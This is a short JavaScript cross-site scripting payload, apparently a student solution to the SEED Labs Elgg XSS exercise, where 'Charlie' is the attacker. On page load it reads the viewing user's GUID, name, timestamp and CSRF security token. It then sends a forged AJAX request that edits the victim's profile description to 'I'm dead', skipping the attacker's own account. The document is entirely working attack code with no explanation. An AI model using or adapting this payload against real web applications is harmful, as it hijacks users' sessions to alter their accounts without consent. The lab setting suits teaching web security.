<script type="text/javascript">
window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token

	var guid="&guid="+elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.
	
	var name="&name="+elgg.session.user.name;
	var des= "&description=I'm dead" + "&acesslevel[description]=2";

	var sendurl= "http://www.xsslabelgg.com/action/profile/edit";

	var content=token + ts + name + des + guid;     //FILL IN
	
	var charlieGuid=46;    //Charlie is the attacker
	if(elgg.session.user.guid != charlieGuid){	//1.)

		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		
		Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}
</script>
